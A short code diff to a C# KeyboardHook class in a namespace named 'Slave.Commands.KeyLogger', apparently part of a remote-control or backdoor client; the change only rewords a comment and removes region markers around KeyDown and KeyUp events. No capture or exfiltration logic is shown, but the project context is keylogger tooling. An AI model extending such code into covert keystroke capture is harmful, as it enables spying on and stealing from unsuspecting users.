@@ -5,7 +5,7 @@ using System.Runtime.InteropServices;
 namespace Slave.Commands.KeyLogger
 {
     /// <summary>
-    /// Class for intercepting low level keyboard hooks,
+    /// Class used to create low level keyboard hooks,
     /// taken from https://github.com/rvknth043/Global-Low-Level-Key-Board-And-Mouse-Hook
     /// </summary>
     internal class KeyboardHook
@@ -21,11 +21,9 @@ namespace Slave.Commands.KeyLogger
         /// </summary>
         /// <param name="keyPressed">VKeys</param>
         public delegate void KeyboardHookCallback(string keyPressed);
-
-        #region Events
+        
         public event KeyboardHookCallback KeyDown;
         public event KeyboardHookCallback KeyUp;
-        #endregion
 
         /// <summary>
         /// Hook ID
